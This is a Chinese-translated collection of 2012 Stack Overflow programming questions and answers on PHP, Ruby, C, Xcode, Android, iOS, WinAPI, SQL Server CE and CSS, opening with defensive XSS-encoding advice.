或在 html 属性内或使用 CSS ....

我强烈推荐 OWASP Abridged XSS Prevention Cheat sheet：[https ://www.owasp.org/index.php/Abridged_XSS_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/Abridged_XSS_Prevention_Cheat_Sheet)

这意味着我们需要根据输出数据的位置来改变计算，我们可以在同一个视图甚至同一个模板中的不同位置输出相同的数据。

所以编码需要在我们将数据放入 HTML 的地方进行，因为我们知道使用哪种编码是正确的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-15T05:43:31.387

我在 Stack Overflow 上发现了一些类似的问题[，Quentin 的回答](https://stackoverflow.com/questions/2401706/where-to-sanitize-php-post-input/2401725#2401725)似乎是回答这个问题的最佳方式。我将他的回答总结为：

**数据应在使用前进行清理。**

由于我从 API 获取不受信任的数据并将其显示在视图中，因此我在此处为 XSS 过滤它。

# php - HTTP 405 错误？Post 方法在一个页面上有效，但在另一个页面上无效（AJAX、Jquery、$.post）

> ID：11927599
> 
> 赞同：0
> 
> 时间：2012-08-13T02:39:28.680
> 
> 标签：php, jquery, ajax, html

我对自己遇到的麻烦完全感到困惑。

我有一个托管在 IIS 中的网站（处于测试阶段，所以一切都通过 localhost）

IIS 7.5

在我的主页（用 HTML 编写）中，我使用 PHP 脚本（$.post 方法）与 WCF 服务通信以验证用户身份（完美运行）。

我还有一个注册页面，它使用不同的 php 脚本与同一个 WCF Web 服务进行通信。但是，当我尝试使用 $.post 方法时，我收到 HTTP 405 错误。让我感到沮丧的是，我不明白它如何在一页上完美运行，而在另一页上抱怨？

我在我的主页上调用我的 $.post 方法，如下所示：

```
 $.post('authenticate.php', $("#frmLogin").serialize(), function(data) {
                        //do stuff  
                }); 
```

没问题。

在不同的 html 页面上调用不同的 php 脚本的相同方法：

```
 $.post('registration.php', $("#frmRegister").serialize(), function(data) {
                            //do stuff
                    }); 
```

我收到 HTTP 405 错误 - 方法不允许。

什么可能是罪魁祸首？我已将 .php 添加到 IIS 处理程序映射中，并且我允许所有动词但同样的问题。我已经尝试将我的 WCF 方法更改为“POST”而不是“GET”（我的身份验证使用 GET 有效）但仍然存在问题。

**更新：**

这是registration.php文件的php代码

```
 <?php

    $UserName = $_POST['UserName'];
    $PassWord = $_POST['PassWord'];
    $Email = $_POST['Email'];

    $wcfClient = new SoapClient('http://localhost/AYAFYAuthenticate/AuthenticationService.svc?wsdl');

    $args = array('uname' => $UserName,'pword' => $PassWord,'email' => $Email);

    $response = $wcfClient->CreateUser($args);

    echo $response->CreateUserResult;
    ?> 
```

这是有效的 authentication.php 文件：

```
 <?php

    $UserName = $_POST['UserName'];
    $PassWord = $_POST['PassWord'];

    $wcfClient = new SoapClient('http://localhost/AYAFYAuthenticate/AuthenticationService.svc?wsdl');

    $args = array('uname' => $UserName,'pword' => $PassWord);

    $response = $wcfClient->Authenticate($args);

    echo $response->AuthenticateResult;
    ?> 
```

谢谢，

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T02:47:42.983

[http://www.checkupdown.com/status/E405.html](http://www.checkupdown.com/status/E405.html)展示了如何修复 405 错误。从那里阅读，我假设它是服务器端的东西。如果您发布 php 将会很有帮助

# c - 如何将用户定义的宏传递给xcodebuild？

> ID：11927601
> 
> 赞同：4
> 
> 时间：2012-08-13T02:39:56.303
> 
> 标签：c, xcode, macros, xcodebuild

我在命令行中通过 xcodebuild 构建我的项目。不在 xCode 中。我想将一些 marc 传递给项目，以便它可以影响代码。比如下面的代码：

```
#if (API_TYPE == 1)
  #define URL_API @"https://dapi.xxx.com/1.1/"
#elif (API_TYPE == 2)
  #define URL_API @"https://tapi.xxx.com/1.1/"
#elif (API_TYPE == 3)
  #define URL_API @"https://api.xxx.com/1.1/"
#else
  #error "API_TYPE value error! should be only value 1,2,3 !"
#endif 
```

我想在代码文件之外传递 API_TYPE 的定义。比如通过 xcodebuild 命令。但它不是这样工作的：

```
xcodebuild -sdk xxx -target xxx SYMROOT=${XCSYMROOT} API_TYPE=${APITYPE} 
```

API_TYPE 的值没有改变。但是 SYMROOT 的值发生了变化。那么如何实现将值传递给 API_TYPE 外部呢？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-11-28T08:37:53.480

我知道这是一篇旧帖子，但为什么不直接使用：

```
xcodebuild GCC_PREPROCESSOR_DEFINITIONS='$GCC_PREPROCESSOR_DEFINITIONS API_TYPE=1' 
```

如果您希望能够让它选择性地覆盖应用程序中的现有定义，只需编写如下代码：

```
#define DEFAULT_API_TYPE 1

#ifdef API_TYPE
  #define REAL_API_TYPE API_TYPE
#else
  #define REAL_API_TYPE DEFAULT_API_TYPE
#endif 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T03:38:42.463

您使用的命令行设置有效地设置了一个环境变量，至少在 Xcode 的构建环境中是这样。但是该构建环境不会传递到编译器的预处理器中，就像设置 shell 环境变量不会使该环境变量在预处理器中可见一样。

要使其在预处理器中可见，请在项目的预处理器宏构建设置中添加一个条目，或者为您想要的特定目标添加一个条目。该条目的格式应为“FOO=$(FOO)”。*Xcode 将此作为“-DFOO= value of FOO from environment* ”传递给编译器。

编辑 Preprocessor Macros 设置时，请确保您正在为 All Configurations 编辑它（或您想要为其设置它的配置，如果您不想为所有配置设置它）。

# javascript - 在 Google Apps 上从 JavaScript 迁移到 Python

> ID：11927604
> 
> 赞同：2
> 
> 时间：2012-08-13T02:40:01.180
> 
> 标签：javascript, python, google-apps-script

我继承了一个相当复杂的 Googledoc 电子表格，其中包含一些在 Google App Engine 中实现的脚本功能。原始编码器使用 JavaScript 环境。就个人而言，我对 Python 更满意，并且在 JavaScript 环境中遇到了各种奇怪的错误。

我想放弃我们拥有的东西并用 Python 重写相同的脚本，这是一个翻译练习，如果你愿意的话……我想知道是否有办法保留原始电子表格，所以我没有重新创建所有现有的电子表格结构（几个选项卡，每个选项卡都有内置的条件格式、过滤器等，更不用说长度和复杂的提交表单）。

所以，简而言之，我想在 GAE 中从 JavaScript 切换到 Python——这可能吗？如果是这样，怎么做？如果没有，有没有办法复制整个电子表格但从空白 Python 脚本重新开始？

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:56:22.580

据我所知，类似 JavaScript 的语言是唯一为 Google Apps Script 提供的语言。

您似乎将它与 Google App Engine 混淆了，后者是一种平台即服务，您可以使用它来编写自己的应用程序，并提供 Java、Python 和 Go 运行时环境。它不是 Google Apps 产品（例如 Docs 电子表格）的脚本语言；这就是 Apps 脚本的用途。

# ruby-on-rails - 在 Ruby 中格式化全名最简洁的方法是什么？

> ID：11927608
> 
> 赞同：1
> 
> 时间：2012-08-13T02:40:28.040
> 
> 标签：ruby-on-rails, ruby

我想从`title`、`first_name`、`middle_name`和生成全名`last_name`。例如比利·鲍勃·桑顿先生。但是`title`and`middle_name`是可选的，我不想得到任何前导或双空格。我想出了很多方法来做它们，但没有一个看起来真的很优雅。到目前为止，这是我的技术

```
full_name = "#{title} #{first_name} #{middle_name} #{last_name}"
#FAIL. Leading and double spaces result

full_name = "#{title} #{first_name} #{middle_name} #{last_name}".gsub(/^ /,'').gsub(/  /,' ')
#Works but all that regex tacked on the end is very ugly

full_name = "#{title}#{title.nil? || title.empty? ? '' : ' '}#{first_name} #{middle_name}#{middle_name.nil? || middle_name.empty? ? '' : ' '}#{last_name}"
#Works but goes on forever 
```

我将使用 Rails，因此可以减少我`.nil? || .empty?`的 to`.blank?`以使最后一个更简洁，但我不禁认为有更好的方法。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-13T03:01:37.217

您正在使用 Rails，因此您可以访问[`String#squish`](http://api.rubyonrails.org/classes/String.html#method-i-squish)：

> **挤压（）**
> 
> 返回字符串，首先删除字符串两端的所有空格，然后将剩余的连续空格组更改为每个空格。

所以你可以这样做：

```
name = "#{title} #{first_name} #{middle_name} #{last_name}".squish 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T02:51:22.357

查看 Ruby 的[String#squeeze](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-squeeze)和[String#strip](http://www.ruby-doc.org/core-1.9.3/String.html#method-i-strip)

```
>> title=""
=> ""
>> first_name="Alice"
=> "Alice"
>> middle_name=""
=> ""
>> last_name=""
=> ""
>> full_name = "#{title} #{first_name} #{middle_name} #{last_name}".squeeze(" ").strip
=> "Alice"
>> last_name="Wu"
=> "Wu"
>> full_name = "#{title} #{first_name} #{middle_name} #{last_name}".squeeze(" ").strip
=> "Alice Wu" 
```

泛化到一个函数应该很容易。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T02:51:35.393

你会寻找这样的东西吗？

```
[title, first_name, middle_name, last_name].compact.reject(&:empty?).join(' ') 
```

带导轨

```
[title, first_name, middle_name, last_name].select(&:present?).join(' ') 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T02:51:46.210

```
[title, first_name, middle_name, last_name].select({|v| v.present?}).join(' ') 
```

# c# - 如何在 SQL Server Compact 3.5 中使应用程序自动递增 id？

> ID：11927611
> 
> 赞同：1
> 
> 时间：2012-08-13T02:41:12.443
> 
> 标签：c#, database, winforms, sql-server-ce, auto-increment

我在我的 WinForm 应用程序中设置了一个 SQL Server Compact 3.5 数据库。我将我的 ID 身份设置为 true，这样当用户添加到数据库时，它会自动给它一个 ID 并自动增加它。但是，由于某种原因，在将第一项输入数据库后，ID 变为 -1，然后变为 -2、-3 等。为什么它不能正确递增？我设置不正确吗？

更新：

![](../Images/e3aa57cdd4a077b926955fbaabec17fd.png)

另一个更新：我运行了应用程序并在数据库中添加了 4 个东西，关闭了应用程序并再次打开它。当我这样做时，所有的 id 都突然正确了。这就像 id 仅在第一次添加时不正确，但在重新加载数据库时它是正确的。希望这是有道理的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:56:24.723

编辑您的表架构和列的集合`Identity Increment = 1`和`Identity Seed = 1`属性`identity`。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T04:08:12.210

检查以下网站：

[SQL Server CE 中是否有任何自动增量类型？](http://social.msdn.microsoft.com/Forums/en-US/sqlce/thread/5276cb88-e756-4926-ad5d-32d68611054c/)

[如何使用 Sql compact 和 C# 启用自动增量](https://stackoverflow.com/questions/5052922/how-to-enable-auto-increment-with-sql-compact-c-sharp)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-28T03:47:15.930

在这个线程中找到了解决方案：

[负主键](https://stackoverflow.com/questions/2473215/negative-primary-keys)

根据该线程中提供的信息，这是因为我在我的应用程序中使用了 DataSet 和 DataAdapter。

# android - 单击复选框时从 ListView 项获取 ID

> ID：11927612
> 
> 赞同：0
> 
> 时间：2012-08-13T02:41:42.490
> 
> 标签：android, listview, checkbox

我使用带有自定义适配器的 ListView 来构建带有复选框的列表。现在我不知道如何从选定的框中获取“ID”。

项目的 xml 文件如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical"
    android:padding="5dp">
    <TextView android:id="@+id/class_open"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" 
        android:visibility="gone" />
    <CheckBox   
        android:id="@+id/checkbox"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentRight="true" 
        android:onClick="clickHandler" />
    <TextView
        android:id="@+id/medi_name"
        android:text="Test"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentLeft="true"
        android:layout_toLeftOf="@id/checkbox" />
</RelativeLayout> 
```

我需要来自：“class_open”的值

这是我的活动：

```
package de.bodprod.dkr;

import java.util.ArrayList;
import java.util.HashMap;

import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;

public class MediNotmediUserListNew extends Activity{
    LayoutInflater inflater;
    ArrayList<HashMap<String, Object>> medi_notmedi_items;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.medi_notmedi_user_list_new);

        ListView mediListCheck = (ListView) findViewById(android.R.id.list);
        inflater = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);

        medi_notmedi_items = new ArrayList<HashMap<String,Object>>();
        SystemDatabaseHandler db = new SystemDatabaseHandler(getApplicationContext());
        medi_notmedi_items = db.getAllNotmedis(); 

        final CustomAdapter adapter = new CustomAdapter(this, R.layout.medi_notmedi_user_list_new, medi_notmedi_items);
        mediListCheck.setAdapter(adapter);

    }

    public void clickHandler(View view) {

    }

    private class CustomAdapter extends ArrayAdapter<HashMap<String, Object>>{
        public CustomAdapter(Context context, int textViewResourceId, ArrayList<HashMap<String, Object>> Strings) {
            super(context, textViewResourceId, Strings);
        }
        private class ViewHolder{
            TextView class_open, title;
        }
        ViewHolder viewHolder;

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            if(convertView==null){        
                convertView=inflater.inflate(R.layout.medi_notmedi_user_list_new_item, null);
                viewHolder=new ViewHolder();
                viewHolder.class_open=(TextView) convertView.findViewById(R.id.class_open);
                viewHolder.title=(TextView) convertView.findViewById(R.id.medi_name);
                convertView.setTag(viewHolder);
            }else{
                viewHolder=(ViewHolder) convertView.getTag();
            }
            viewHolder.class_open.setText(medi_notmedi_items.get(position).get("sql_id").toString());
            viewHolder.title.setText(medi_notmedi_items.get(position).get("wirk").toString());
            return convertView;
        }
    }       
} 
```

如何从 clickHandler 的 class_open 字段中获取值？

1.  是否可以将值直接分配给复选框并请求它？
2.  是否可以从 class_open 字段请求值？

请原谅我的英语不好

马库斯

# facebook - facebook无法读取未登录的og元标签

> ID：11927613
> 
> 赞同：-1
> 
> 时间：2012-08-13T02:41:44.327
> 
> 标签：facebook, meta-tags

我该如何解决这个问题？当 Facebook 尝试读取“og 元标签”时，它无法读取，因为它没有登录到我的网站，它会被重定向到 index.php。

```
session_start();
if (!isset($_SESSION['id'])) {
    header("location: index.php");
} 
```

我使用 Facebook 让用户登录（php 会话），我认为通过在对象 url 上提供访问令牌可以让 Facebook 访问，但事实并非如此。

```
FB.api(
    '/me/namespace:request',
    'post',
    {
       test: 'http://mysite.co.uk/info.php?id=<?php echo $id; ?>&access_token=<?php echo $access_token; ?>' 
    }, 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T04:39:23.380

通过检查 facebook 用户代理并仅输出元标记来解决此问题

# php - 在 PHP 中缓存天气

> ID：11927620
> 
> 赞同：0
> 
> 时间：2012-08-13T02:43:28.787
> 
> 标签：php, xml, xml-parsing

我的代码：

```
<? 
    $url = 'http://w1.weather.gov/xml/current_obs/KGJT.xml'; 
    $xml = simplexml_load_file($url); 
?>

<? 
    echo $xml->weather, " ";
    echo $xml->temperature_string;
?> 
```

这很好用，但我读到缓存外部数据是提高页面速度的必要条件。我怎样才能缓存这个让我们说 5 个小时？

我调查了一下`ob_start()`，这是我应该使用的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T02:47:16.070

`ob_start`不会是一个很好的解决方案。这仅适用于您需要修改或刷新输出缓冲区的情况。您返回的 XML 数据没有发送到缓冲区，因此不需要这些调用。

这是我过去使用过的一种解决方案。不需要 MySQL 或任何数据库，因为数据存储在平面文件中。

```
$last_cache = -1;
$last_cache = @filemtime( 'weather_cache.txt' ); // Get last modified date stamp of file
if ($last_cache == -1){ // If date stamp unattainable, set to the future
    $since_last_cache = time() * 9;
} else $since_last_cache = time() - $last_cache; // Measure seconds since cache last set

if ( $since_last_cache >= ( 3600 * 5) ){ // If it's been 5 hours or more since we last cached...

    $url = 'http://w1.weather.gov/xml/current_obs/KGJT.xml'; // Pull in the weather
    $xml = simplexml_load_file($url); 

        $weather = $xml->weather . " " . $xml->temperature_string;

    $fp = fopen( 'weather_cache.txt', 'a+' ); // Write weather data to cache file
    if ($fp){
        if (flock($fp, LOCK_EX)) {
           ftruncate($fp, 0);
           fwrite($fp, "\r\n" . $weather );
           flock($fp, LOCK_UN);
        }
        fclose($fp);
    }
}

include_once('weather_cache.txt'); // Include the weather data cache 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T02:47:38.663

ob 系统用于脚本内缓存。它对于持久性多调用缓存没有用处。

要正确执行此操作，您需要将生成的 xml 从文件中写入。每次脚本运行时，您都会检查该文件的最后更新时间。如果超过 5 小时，则获取/保存新副本。

例如

```
$file = 'weather.xml';
if (filemtime($file) < (time() - 5*60*60)) {
    $xml = file_get_contents('http://w1.weather.gov/xml/current_obs/KGJT.xml');
    file_put_contents($file, $xml);
}
$xml = simplexml_load_file($file); 

echo $xml->weather, " ";
echo $xml->temperature_string; 
```

# c++ - 主对话框在命令消息处理程序返回之前销毁

> ID：11927622
> 
> 赞同：2
> 
> 时间：2012-08-13T02:43:55.423
> 
> 标签：c++, windows, winapi, user-interface, wtl

我的程序使用无模式对话框与用户交互，并且还有一个托盘图标。用户可以使用托盘图标立即退出应用程序。

```
BOOL OnInitDialog()
{
    init data...
}

void OnDestroy()
{
    destroy data...
}

void OnSomeButton()
{
    CFileDialog dlg;
    ...
    dlg.DoModal(m_hWnd));
    access data...
    ...
}

void OnMenuExit()
{
    DestroyWindow();
} 
```

问题是当我弹出一个模态对话框（`OnSomeButton`），然后使用托盘图标菜单退出时，主对话框首先被破坏，然后模态对话框返回，试图访问一些无效数据，导致崩溃。

我知道我可以在访问数据之前添加一些检查代码，但是还有其他方法吗？有什么方法可以确保 OnSomeButton() 在窗口销毁之前返回？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T02:46:56.417

您需要添加自己的应用程序级代码。这个问题没有系统支持，主要是因为可能有太多的特殊性，以至于没有通用的方法是可能的。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T03:04:01.513

是的。当您从托盘菜单退出时，您可以向`WM_CLOSE`您的模态对话框发送一条或类似的消息，使其退出。即使您的主窗口在`OnSomeButton`返回之前被销毁，只要该函数的其余部分不访问任何类内部（成员变量等），您也可以。您可以通过让模态对话框的窗口进程在以这种方式关闭时返回“中止”代码或其他内容来确保这一点。

# c++ - 使用 C++ 和 WinAPI 在 Windows 8 上获取登录用户名或电子邮件

> ID：11927625
> 
> 赞同：1
> 
> 时间：2012-08-13T02:44:34.970
> 
> 标签：c++, winapi, windows-8, sessionid

在 Windows 7 上检索登录用户的名称，我可以这样做：

```
LPTSTR pUserName = NULL;
DWORD dwcbSzUserName = 0;

//'dwSessID' = user session ID
if(WTSQuerySessionInformation(WTS_CURRENT_SERVER_HANDLE, dwSessID, WTSUserName, &pUserName, &dwcbSzUserName))
{
    //Got user name in 'pUserName'
}

if(pUserName)
    WTSFreeMemory(pUserName); 
```

但在 Windows 8 上，它会返回一些缩写名称，例如，当实际用户的名称是“John A. Doe”时，它会返回“john_000”。

那么，使用 WinAPI 在 Windows 8 上使用 C++ 检索登录用户的名称（可能还有他们的电子邮件）的方法是什么，如登录屏幕所示？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T03:40:20.890

您可以使用[USER_INFO_23](http://msdn.microsoft.com/en-us/library/windows/desktop/aa371335%28v=vs.85%29.aspx "USER_INFO_23")尝试使用[NetUserGetInfo](http://msdn.microsoft.com/en-us/library/windows/desktop/aa370654%28v=vs.85%29.aspx "网络用户获取信息")来获取全名。

基本上像：

```
 //Got user name in 'pUserName'
    NetUserGetInfo(NULL, pUserName, 23, my_USER_INFO_23);
    //Got display name in my_USER_INFO_23.usri23_full_name 
```

# redirect - C 程序中的 I/O 重定向

> ID：11927627
> 
> 赞同：0
> 
> 时间：2012-08-13T02:44:43.587
> 
> 标签：redirect, io

我想在 C 程序中实现一个简单的“cat file1 > file1”命令。我尝试了以下方法，但它不起作用......

```
main () {
    pid_t pid;
    FILE *ip, *op;
    char *args[3];
    printf("Name of the executable program\n\t");
    scanf("%s", &name[0]); // I entered cat here
    printf("Name of the input file\n\t");
    scanf("%s", &name[1]); //file1.txt
    printf("Name of the output file\n\t");
    scanf("%s", &name[0]); //file2.txt
    pid = fork();
    if(pid == -1)
        perror("fork() error");
    else if(pid > 0)
        waitpid(-1, NULL, 0);
    else if (pid == 0) {
        op = fopen(name[2], "w");
        close(1);
        dup(op);
        execlp(name[0], name[1], NULL);
        }
    return 0;
    }// end of main() 
```

我以为`execlp()`将运行`cat file1.txt`并且它的输出将被重定向到`file2.txt`，但事实并非如此，我不知道为什么。我该怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T05:35:15.237

第一个参数[`execlp()`](http://pubs.opengroup.org/onlinepubs/9699919799/functions/exec.html)是要查找的名称；第二个和后面的参数是`argv`列表，以 . 开头`argv[0]`。

```
int execlp(const char *file, const char *arg0, ... /*, (char *)0 */); 
```

`open()`对于 shell I/O 重定向，打开文件比使用标准 I/O (`<stdio.h>`和)更容易`FILE *`；您还应该关闭在 之后打开的文件`dup()`，尽管它更易于使用`dup2()`。您需要分配空间来读取字符串；在许多系统上，原始代码会崩溃，因为其中的指针`str`不指向任何地方。通常，只有在一切正常的情况下，您才应该以状态 0 退出；否则，以非零退出状态退出。

这将导致：

```
#include <fcntl.h>      /* open() */
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>   /* waitpid() */
#include <unistd.h>     /* execlp(), fork(), dup2() */

int main(void)
{
    pid_t pid;
    pid_t corpse;
    int   status;
    char  name[3][50];
    printf("Name of the executable program\n\t");
    if (scanf("%49s", name[0]) != 1)
        return(EXIT_FAILURE);
    printf("Name of the input file\n\t");
    if (scanf("%49s", name[1]) != 1)
        return(EXIT_FAILURE);
    printf("Name of the output file\n\t");
    if (scanf("%49s", name[2]) != 1)
        return(EXIT_FAILURE);
    pid = fork();
    if (pid == -1)
    {
        perror("fork() error");
        return(EXIT_FAILURE);
    }
    else if (pid > 0)
        corpse = waitpid(-1, &status, 0);
    else
    {
        int fd = open(name[2], O_WRONLY|O_CREAT|O_EXCL, 0644);
        if (fd < 0)
        {
            fprintf(stderr, "Failed to open %s for writing\n", name[2]);
            return(EXIT_FAILURE);
        }
        dup2(fd, 1);
        close(fd);
        execlp(name[0], name[0], name[1], NULL);
        fprintf(stderr, "Failed to exec %s\n", name[0]);
        return(EXIT_FAILURE);
    }
    return(corpse == pid && status == 0 ? EXIT_SUCCESS : EXIT_FAILURE);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T03:07:39.193

```
scanf("%s", &name[0]); // I entered cat here
printf("Name of the input file\n\t");
scanf("%s", &name[1]); //file1.txt
printf("Name of the output file\n\t");
scanf("%s", &name[0]); //file2.txt 
```

显然不是实际代码的 C&P -`name`应该是`args`，最后一个应该是“2”而不是 0。

此外，dup 适用于文件描述符，而不是 FILE*，因此需要查看 open 而不是 fopen，或者任何从 FILE* 获取 fd 的方法

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T03:13:29.430

您必须使用 fork() 进程并将其文件描述符重新分配给先前（手动）打开（）的文件，或使用 system() 调用让 shell 为您处理它。

# ios - 如何根据子视图正确调整父视图的大小？（以包含 UITextView 的 UITableViewCell 为例）

> ID：11927632
> 
> 赞同：1
> 
> 时间：2012-08-13T02:46:32.630
> 
> 标签：ios, objective-c, uitableview, cocoa-touch, uitextview

就我而言，我将如何调整 a的大小以适应它包含`UITableViewCell`的 a 的高度？`UITextView`

我目前正在尝试使用以下代码来实现这一点：

```
- (CGFloat) tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath {

    // init the font that we use
    UIFont *font = [UIFont fontWithName:@"SourceSansPro-Regular" size:16];

    if (indexPath.section == 0) {

        // get the text size of the thread
        CGSize textSize = [_thread.text sizeWithFont:font constrainedToSize:CGSizeMake(280, CGFLOAT_MAX) lineBreakMode:UILineBreakModeWordWrap];

        return textSize.height + 20;

    }

    // default
    return 60;

} 
```

我觉得如果我可以访问`UITableViewCell`in 这个方法，那么我可以使用 in 它的`contentSize`属性`UITextView`，然后返回它。但我认为在执行流程的这一点上是不可能的。

我不能只调整那个缓冲区，因为它不会随着 get size 函数返回的文本大小而缩放。文本越短，缓冲区越大越明显。

这是调整 的高度`UITableViewCell`，但并没有显示它的所有`UITextView`内部。我已经`UITextView`在`sizeWithFont:constrainedToSize:lineBreakMode:`方法中指定了 的宽度，即`280`. 我已经指定我希望基本上没有最大高度，以便它可以使用`CGFLOAT_MAX`常量尽可能多地自动换行。我将一个单位缓冲区附加`20`到方法调用的结果高度，因为在 my`20`的 , 上方有一个单位缓冲区，我还想在它下面有一个单位缓冲区。`UITextView``Storyboard``20`

不过，所有这一切的最终结果仍然是文本被剪掉了。这是我正在谈论的图片：

![剪切的单元格内容](../Images/defe917c54a8a25ebb84223432b270ea.png)

有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T15:12:17.480

我将继续回答我的问题。答案分为两个步骤。

首先，`UITextView`在方法内部调整逻辑​​期间的大小`tableView:cellForRowAtIndexPath:`。确保*在*对`UITextView`. 我`UITextView`使用以下方法重新调整我的大小，在文本视图的子类`UITableViewCell`中：`self.text`

```
- (void)resizeTextView {

    // get the current frame size
    CGRect frame = self.text.frame;

    // set it to the height of the text view
    frame.size.height = self.text.contentSize.height;

    // set the new size of the text view
    self.text.frame = frame;

} 
```

`UITableViewCell`接下来，我指定方法内部的高度`tableView:heightForRowAtIndexpath:`。这是最神秘的地方，因为要获得该行的高度，您必须计算将在该行中显示的任何文本的高度，以及您需要计算高度的任何其他内容。在我的场景中，是一个`UITextView`. 如果无法访问`UITableViewCell`此方法中的实例，您将不得不使用类似`sizeWithFont:constrainedToSize:lineBreakMode:`. 但是，我注意到这并没有为我返回一致的高度。或者至少，似乎不是为我的文本腾出足够空间的高度`UITextView`。不过，这就是问题所在。文本视图具有额外的左右填充以及不同的行高或其他内容，而不是该`sizeWithFont`方法使用的。

所以，在捏造了`sizeWithFont`一段时间的方法结果之后，我最终得到了以下代码：

```
- (CGFloat) tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath {

    // init the font that we use
    UIFont *font = [UIFont fontWithName:@"SourceSansPro-Regular" size:16];

    if (indexPath.section == 0) {

        // get the text size of the thread
        CGSize textSize = [_thread.text sizeWithFont:font constrainedToSize:CGSizeMake(280 - 16, CGFLOAT_MAX) lineBreakMode:UILineBreakModeWordWrap];

        // text height + padding
        return textSize.height + 40;

    } else if (indexPath.section == 1) {

        // get the comment for this row
        Comment *comment = [_comments objectAtIndex:indexPath.row];

        // get the heights of the text areas
        CGSize textSize = [comment.text sizeWithFont:font constrainedToSize:CGSizeMake(280 - 16, CGFLOAT_MAX) lineBreakMode:UILineBreakModeWordWrap];

        return textSize.height + 40;

    }

    return 60;

} 
```

在尺寸约束参数中，我减去了 16 个单位，因为在`UITextView`左右两侧都有大约 8 个单位的填充。这将使我们的结果更接近我们对文本高度的预期。

我还在 40 个单位的最终高度上添加了一些填充，因为行本身需要在`UITextView`.

给你！希望有帮助。

# html - css 菜单样式

> ID：11927645
> 
> 赞同：2
> 
> 时间：2012-08-13T02:47:38.620
> 
> 标签：html, css

我遇到了一些 CSS 尝试在下拉菜单中的每个元素之后给我的下拉表一些 1 px 实心黑线的问题。这就是我的菜单现在的样子

![当前的](../Images/a2e7307d62627555b1b7fa92b3d92809.png)

这就是我希望它看起来的样子，除了我`border: 1px solid black;`将这一行放在 .menu li a { } 中，但我不希望它应用于草稿按钮，它在这张图片中有一个双边框。

我怎样才能解决这个问题？

![在此处输入图像描述](../Images/365371f461d06749615e08de9f2765c8.png)

**图片中下拉元素的代码。**

* * *

```
.menu .dropdown_1col {
    margin:4px auto;
    left:-999em;

    position:absolute;
    background:#F4F4F4;
     border: 1px solid black;
    text-indent:15px;
    background: -moz-linear-gradient(top, #EEEEEE, #BBBBBB);
    background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#EEEEEE), to(#BBBBBB));
} 
```

* * *

```
 .menu li {
        float:left;
        text-align:center;
        position:relative;
        padding: 4px 10px 4px 10px;
        margin-right:30px;
        margin-top:7px;
        border:none;

    }
    .menu li:hover {
        z-index:2;
        background:#F4F4F4;
        border:1px solid #aaaaaa;
        padding: 4px 9px 4px 9px;

        /* CSS 3 Stylings */

        background: -moz-linear-gradient(top, #F4F4F4, #EEEEEE);
        background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#F4F4F4), to(#EEEEEE));

    }
    .menu li a {
        color: #EEEEEE;
        outline:0;
        text-decoration:none;
        display:block;
        text-shadow: 1px 1px 1px #000;

    }
    .menu li:hover a {
        color:#161616;
        text-shadow: none;
    }
    .menu li .drop {
        padding-right:21px;
        background:url("img/drop.png") no-repeat right 8px;
    }
    .menu li:hover .drop {
        padding-right:21px;
        background:url("img/drop.png") no-repeat right 7px;
    }
    .menu li:hover div a {
        color:#444;
    }
    .menu li:hover div a:hover {
        color:#777;
    }
    .menu li ul li a:hover {
        color:#777;
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T02:53:54.367

改成：

```
{
    .........
    border: 1px 0px solid #aaaaaa;
    .........
} 
```

这样，您将分别设置 vert 和 horz 边框的宽度。您还可以通过指定 individual`border-top` `border-left`等来玩转。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T05:38:28.433

为了避免这个问题，你可以试试这个：

***CSS 代码***

```
 .menu li a{
      border:none;
    } 
```

***别的***

```
 .menu li{
      border:none;
    } 
```

